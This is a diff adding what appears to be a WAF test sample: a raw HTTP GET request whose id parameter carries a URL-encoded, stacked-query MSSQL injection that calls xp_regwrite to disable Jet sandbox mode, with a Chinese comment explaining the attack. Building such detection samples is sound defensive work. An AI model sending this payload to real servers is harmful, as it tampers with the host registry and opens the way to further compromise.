@@ -1,0 +1,9 @@
+# SQL注入_GET_mssql_普通注入-06506423
+# 攻击者基于堆叠查询，将"exec  master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Wow6432Node\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0"语句注入到 SQL 查询参数中，目的是针对64位系统利用数据库存储过程master..xp_regwrite修改注册表开启数据库沙盒模式。
+GET /?id=1%3Bexec%20%20master..xp_regwrite%20%27HKEY_LOCAL_MACHINE%27%2C%27SOFTWARE%5CWow6432Node%5CMicrosoft%5CJet%5C4.0%5CEngines%27%2C%27SandBoxMode%27%2C%27REG_DWORD%27%2C0&bid=hd_tag_m8mv26oe HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26oe
+RM-PRO-Token: ed4f104c2b06bafeb0a61670f9e6d1c0
+RM-PRO-Time: 1742808645076
+User-Agent: curl/7.83.1
+
